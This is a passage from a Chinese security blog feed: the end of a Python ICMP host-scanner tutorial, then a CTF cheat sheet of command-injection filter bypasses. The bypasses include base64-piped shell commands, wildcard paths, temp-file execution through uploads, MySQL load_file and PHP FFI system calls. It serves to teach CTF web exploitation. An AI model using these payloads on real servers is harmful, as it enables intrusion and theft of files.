class="params">network</span>):</span></span><br><span class="line">    threads = []</span><br><span class="line">    length = <span class="built_in">len</span>(network)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> network:</span><br><span class="line">        t = threading.Thread(target=icmp_request, args=(<span class="built_in">str</span>(ip),))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        threads[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;----------------scan begin----------------&quot;</span>)</span><br><span class="line">    network = <span class="built_in">list</span>(ipaddress.ip_network(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    icmp_speed(network)</span><br><span class="line">    print(<span class="string">&quot;----------------scan end------------------&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Scan finished: &quot;</span>, <span class="built_in">len</span>(network), <span class="string">&quot;IP addresses (&quot;</span>, a, <span class="string">&quot;hosts up) scanned&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210928003603.png" style="zoom:80%;">





<h2 id="argparse模块"><a href="#argparse模块" class="headerlink" title="argparse模块"></a>argparse模块</h2><p>argsparse是python的命令行解析的标准模块，内置于python，不需要安装。这个库可以让我们直接在命令行中就可以向程序中传入参数并让程序运行。</p>
<p>来看一个最简单的argsparse库的使用的例子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#demo.py</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;命令行中传入一个数字&#x27;</span>)</span><br><span class="line"><span class="comment">#type是要传入的参数的数据类型  help是该参数的提示信息</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;integers&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;传入的数字&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获得传入的参数</span></span><br><span class="line">print(args)</span><br></pre></td></tr></table></figure>


<p>在命令行中输入<code>python demo.py -h</code>或者<code>python demo.py --help</code>, 这里我输入的是</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">python demo.py -h</span><br></pre></td></tr></table></figure>


<p>在命令行中看到demo.py的运行结果如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usage: demo.py [-h] integers</span><br><span class="line"></span><br><span class="line">命令行中传入数字</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  integers    传入的数字</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br></pre></td></tr></table></figure>


<p>现在我们在命令行中给demo.py 传入一个参数5，</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">python demo.py 5</span><br></pre></td></tr></table></figure>


<p>运行，得到的运行结果是</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Namespace(integers=&#x27;5&#x27;)</span><br></pre></td></tr></table></figure>


<h3 id="主机存货探测脚本（最终版）"><a href="#主机存货探测脚本（最终版）" class="headerlink" title="主机存货探测脚本（最终版）"></a><strong>主机存货探测脚本（最终版）</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_request</span>(<span class="params">ip_dst</span>):</span></span><br><span class="line">    <span class="keyword">global</span> a  <span class="comment"># call a</span></span><br><span class="line">    pocket = Ether()/IP(dst=ip_dst)/ICMP(<span class="built_in">type</span>=<span class="number">8</span>)/<span class="string">b&#x27;Hello&#x27;</span></span><br><span class="line">    req = srp1(pocket, timeout=<span class="number">2</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> req:</span><br><span class="line">        print(<span class="string">&#x27;[+]&#x27;</span>, ip_dst, <span class="string">&#x27; Host is up&#x27;</span>)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_speed</span>(<span class="params">network</span>):</span></span><br><span class="line">    threads = []</span><br><span class="line">    length = <span class="built_in">len</span>(network)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> network:</span><br><span class="line">        t = threading.Thread(target=icmp_request, args=(<span class="built_in">str</span>(ip),))</span><br><span class="line">        threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        threads[i].start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;imformation&#x27;</span>)</span><br><span class="line">    <span class="comment"># type是要传入的参数的数据类型  help是该参数的提示信息</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;network&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;eg: 192.168.1.0/24&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    print(<span class="string">&quot;----------------scan begin(%s)----------------&quot;</span>%time.ctime())</span><br><span class="line">    network = <span class="built_in">list</span>(ipaddress.ip_network(args.network))</span><br><span class="line">    icmp_speed(network)</span><br><span class="line">    print(<span class="string">&quot;----------------scan end(%s)------------------&quot;</span>%time.ctime())</span><br><span class="line">    print(<span class="string">&quot;Scan finished: &quot;</span>, <span class="built_in">len</span>(network), <span class="string">&quot;IP addresses (&quot;</span>, a, <span class="string">&quot;hosts up) scanned&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210928133019.png" style="zoom:80%;">



<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>通过此次的主机存活探测程序的编写，不仅让我对icmp协议有了更深刻的理解，同时也学到的python的一些有趣的模块。更是提高了我的代码编写能力，努力逃离脚本小子称号！</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.csdn.net/qq_42551635/article/details/119507187">https://blog.csdn.net/qq_42551635/article/details/119507187</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/91601448">https://zhuanlan.zhihu.com/p/91601448</a></p>
<p><a href="https://juejin.cn/post/6854573211598716941">https://juejin.cn/post/6854573211598716941</a></p>
<p><a href="https://blog.csdn.net/zhizhengguan/article/details/109206015">https://blog.csdn.net/zhizhengguan/article/details/109206015</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/56922793">https://zhuanlan.zhihu.com/p/56922793</a></p>
]]></content>
      <categories>
        <category>脚本开发</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行绕过小技巧</title>
    <url>/2021/02/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p> 重新对CTF中常见的命令执行绕过小技巧做了一个归纳总结</p>
<a id="more"></a>

<h1 id="常见的系统命令执行函数"><a href="#常见的系统命令执行函数" class="headerlink" title="常见的系统命令执行函数"></a>常见的系统命令执行函数</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>
<p>这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</p>
<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
<h1 id="管道符-amp-通配符"><a href="#管道符-amp-通配符" class="headerlink" title="管道符&amp;通配符"></a>管道符&amp;通配符</h1><h2 id="windows-下"><a href="#windows-下" class="headerlink" title="windows 下"></a>windows 下</h2><blockquote>
<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<h2 id="Linux-下"><a href="#Linux-下" class="headerlink" title="Linux 下"></a>Linux 下</h2><blockquote>
<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<p>在linux系统中 有一些通配符</p>
<ul>
<li>匹配任何字符串／文本，包括空字符串；</li>
<li><code>*</code>代表任意字符（0个或多个)</li>
<li><code>?</code> 匹配任何一个字符（不在括号内时）?代表任意1个字符</li>
<li>[abcd] 匹配abcd中任何一个字符</li>
<li>[a-z]  表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符</li>
</ul>
<hr>
<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
<p><code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> 重定向符<br><code>%09</code>(需要php环境)<br><code>$&#123;IFS&#125; </code><br><code>$IFS$9</code><br><code>&#123;cat,flag.php&#125;</code>  //用逗号实现了空格功能<br><code>%20 </code><br><code>%09 </code></p>
</blockquote>
<hr>
<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p>
<blockquote>
<p>  <code>a=c;b=at;c=fl;d=ag;$a$b $c$d</code></p>
</blockquote>
<p> base64编码</p>
<blockquote>
<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</code>   (在bash被过滤的情况下可尝试sh)</p>
</blockquote>
<p>单引号、双引号</p>
<blockquote>
<p><code>c&quot;&quot;at fl&#39;&#39;ag</code></p>
</blockquote>
<p>反斜线</p>
<blockquote>
<p><code>c\at fl\ag</code></p>
</blockquote>
<p>正则 (假设/bin/cat: test: 是一个目录)</p>
<blockquote>
<p><code>/???/?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</code><br><code>/???/?at ????</code><br><code>/???/?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</code></p>
</blockquote>
<p> $1、$2等和$@</p>
 <figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$</span># 是传给脚本的参数个数</span><br><span class="line"><span class="meta"><span class="meta-keyword">$0</span> 是脚本本身的名字</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$1</span> 是传递给该shell脚本的第一个参数</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$2</span> 是传递给该shell脚本的第二个参数</span></span><br><span class="line"><span class="symbol">$</span>@ 是传给脚本的所有参数的列表</span><br><span class="line"><span class="symbol">$</span>* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过<span class="number">9</span>个</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span> 是脚本运行的当前进程ID号</span><br><span class="line"><span class="symbol">$</span>? 是显示最后命令的退出状态，<span class="number">0</span>表示没有错误，其他表示有错误</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote>
<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
</blockquote>
<h1 id="括号被过滤"><a href="#括号被过滤" class="headerlink" title="括号被过滤"></a>括号被过滤</h1><p><img src="http://img.npfs06.top/20210225161206.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<hr>
<h1 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h1><blockquote>
<p>cat$IFS$9`ls`</p>
<p>cat$IFS$9$(ls)</p>
</blockquote>
<p>(内联，就是将``或$()内命令的输出作为输入执行)</p>
<hr>
<h1 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h1><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># echo &quot;flag&#123;hahaha&#125;&quot; &gt; flag.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ag&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;fl\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;t \\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># touch &quot;ca\\&quot;</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/</span>桌面<span class="comment"># ls -t</span></span><br><span class="line"><span class="string">&#x27;ca\&#x27;  &#x27;</span>t \<span class="string">&#x27;  &#x27;</span>fl\<span class="string">&#x27;   ag   flag</span></span><br><span class="line"><span class="string">root@kali:~/桌面# ls -t &gt;a     #将 ls -t 内容写入到a文件中</span></span><br><span class="line"><span class="string">root@kali:~/桌面# sh a</span></span><br><span class="line"><span class="string">a: 1: a: not found</span></span><br><span class="line"><span class="string">flag&#123;hahaha&#125;</span></span><br><span class="line"><span class="string">a: 6: flag.txt: not found</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>\</code>是指换行<br><code>ls -t</code>将文件按时间排序输出<br><code>sh</code>命令可以从一个文件中读取命令来执行</p>
</blockquote>
<h1 id="bin"><a href="#bin" class="headerlink" title="bin/"></a>bin/</h1><p><strong>bin目录:</strong> </p>
<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</p>
<p>这里我们可以利用 base64 中的64 进行通配符匹配  即 /bin/base64 flag.php</p>
<p><strong>/usr/bin目录:</strong></p>
<p>?c=/???/???/????2 ????.???      —》 然后在url + /flag.php.bz2</p>
<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
<p>我们可以利用/usr/bin下的<strong>bzip2</strong></p>
<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
<h1 id="post上传文件进行命令执行"><a href="#post上传文件进行命令执行" class="headerlink" title="post上传文件进行命令执行"></a>post上传文件进行命令执行</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>首先构造一个post上传文件的数据包</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传一个php文件，文件内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>注：shell程序必须以”#!/bin/sh”开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径</p>
<p><img src="http://img.npfs06.top/20210225161339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>上传抓包</p>
<p>抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令</p>
<p><img src="http://img.npfs06.top/20210225161351.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>注：这里为什么要传参数，以及参数内容为什么是  .%20/???/????????[@-[] ,P神的文章已经写的很详细了</p>
<p><img src="http://img.npfs06.top/20210225161405.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p><img src="http://img.npfs06.top/20210225161419.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>1.php就是我们上传的可控的文件，我们传的参数c的值为 . /bin/phpXXXXXX，意思就是说匹配上传1.php文件所生成的临时文件，并执行之</p>
<p>可以看到flag.php文件，</p>
<p><img src="http://img.npfs06.top/20210225161433.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>用cat命令读取文件即可</p>
<h1 id="无参数文件名构造"><a href="#无参数文件名构造" class="headerlink" title="无参数文件名构造"></a>无参数文件名构造</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如这题，我们需要构造的文件名为36</p>
<p><img src="http://img.npfs06.top/20210225161449.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>payload：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>


<h1 id="glob遍历文件名"><a href="#glob遍历文件名" class="headerlink" title="glob遍历文件名"></a>glob遍历文件名</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="mysql的load-file读文件"><a href="#mysql的load-file读文件" class="headerlink" title="mysql的load_file读文件"></a>mysql的<code>load_file</code>读文件</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>


<h1 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h1><blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="regexp">//</span>创建一个system对象</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="regexp">//</span>没有回显的</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="regexp">//</span>通过<span class="variable">$ffi</span>去调用system函数</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<h1 id="数学函数白名单过滤"><a href="#数学函数白名单过滤" class="headerlink" title="数学函数白名单过滤"></a>数学函数白名单过滤</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 过滤模板  题目来源国赛 love_math</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span 